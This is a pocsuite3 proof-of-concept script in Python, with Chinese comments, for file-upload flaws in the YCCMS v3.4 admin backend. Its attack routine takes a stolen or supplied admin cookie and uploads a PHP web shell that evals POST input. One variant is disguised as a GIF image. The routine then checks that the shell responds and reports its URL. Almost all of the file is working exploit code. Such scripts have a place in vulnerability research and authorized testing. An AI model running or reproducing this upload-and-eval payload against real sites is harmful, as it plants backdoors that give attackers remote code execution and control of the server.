from collections import OrderedDict
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str
from requests_toolbelt.multipart.encoder import MultipartEncoder
import re

class DemoPOC(POCBase):
    vulID = '0'  # Seebug 漏洞收录ID，如果没有则为0
    version = '1'  # PoC 的版本，默认为1
    author = 'midi'  # PoC 的作者
    vulDate = '2021-05-12'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2022-01-24'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2022-01-24'  # PoC 更新日期 (%Y-%m-%d)
    references = ['https://blog.csdn.net/qq_45742511/article/details/116664586']  # 漏洞来源地址，0day 不用写
    name = 'YCCMS v3.4系统后台多处存在文件上传可getshell'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'http://www.yccms.net/'  # 漏洞厂商主页地址
    appName = 'YCCMS'  # 漏洞应用名称
    appVersion = '3.4'  # 漏洞影响版本
    vulType = 'Upload Files'  # 漏洞类型，参见漏洞类型规范表
    desc = 'YCCMS v3.4系统后台多处存在上传漏洞'  # 漏洞简要描述
    samples = ['http://192.168.3.8']  # 测试样列，就是用 PoC 测试成功的目标
    pocDesc = '''使用attack时，需要提供后台的用户的cookie。
                usage: pocsuite -u http://localhost -r pocs/yccms3.4_file-upload.py --c PHPSESSID=psqd0328o9tf73rnljkiofqs21
                attack: pocsuite -u http://localhost -r pocs/yccms3.4_file-upload.py --c PHPSESSID=psqd0328o9tf73rnljkiofqs21 --attack
                '''

    def _options(self):
        o = OrderedDict()
        o["c"] = OptString('', description='cookie',require=True)
        return o

    def _verify(self):
        cookie = self.get_option("c")
        result = {}

        # payload = "path={0}".format(self.get_option("username"))
        payload2 = "/admin/?a=admin&m=update "
        resp = requests.get(self.url+payload2)
        if resp and resp.status_code == 200:
            s = requests.session()
            headers = {
                "Cookie": "{}".format(cookie)
            }
            r = s.get(url=self.url + "/admin/?a=admin", headers=headers)
            # print(r.text)
            if r.status_code == 200 and "系统设置" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Referer'] = payload2
            else:
                print("Cookie错误或者已失效")
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        cookie = self.get_option("c")
        result = {}
        s = requests.session()
        # payload 1
        filename = random_str(6) + ".php"
        fileDict = {'MAX_FILE_SIZE': '2097152', 'send': '',
                    'pic': ("{}".format(filename), r'''<?php echo "happy day";@eval($_POST["midi"]);?>''', "image/png")}
        m = MultipartEncoder(fields=fileDict, boundary="-------45962402127348")
        headers = {"content-type": m.content_type, "Cookie": "{}".format(cookie)}
        s.post(url=self.url+"/admin/?a=call&m=upLoad", data=m, headers=headers)
        if "happy day" in requests.get(url=self.url + "/view/index/images/logo.php").text:
            result['ShellInfo'] = {}
            result['ShellInfo']['URL'] = self.url + "/view/index/images/logo.php"
            result['ShellInfo']['Content'] = '<?php echo "happy day";@eval($_POST["midi"]);?>'

        # payload 2
        if not result:
            fileDict = {'filedata': (
            "{}".format(filename), r'''GIF89a\n<?php echo "happy day";@eval($_POST["midi"]);?>''', "image/png")}
            m = MultipartEncoder(fields=fileDict, boundary="-------45962402127348")
            headers = {"content-type": m.content_type, "Cookie": "{}".format(cookie)}
            resp = s.post(url=self.url+"/admin/?a=call&m=xhUp&type=xh", data=m, headers=headers)
            path1 = re.search("(.*?)\/uploads\/(.*?)'", resp.text)
            if path1 and "happy day" in requests.get(url=self.url + "/uploads/{}".format(path1.group(2))).text:
                result['ShellInfo'] = {}
                result['ShellInfo']['URL'] = self.url + "/uploads/{}".format(path1.group(2))
                result['ShellInfo']['Content'] = 'GIF89a\n<?php echo "happy day";@eval($_POST["midi"]);?>'
        return self.parse_output(result)


register_poc(DemoPOC)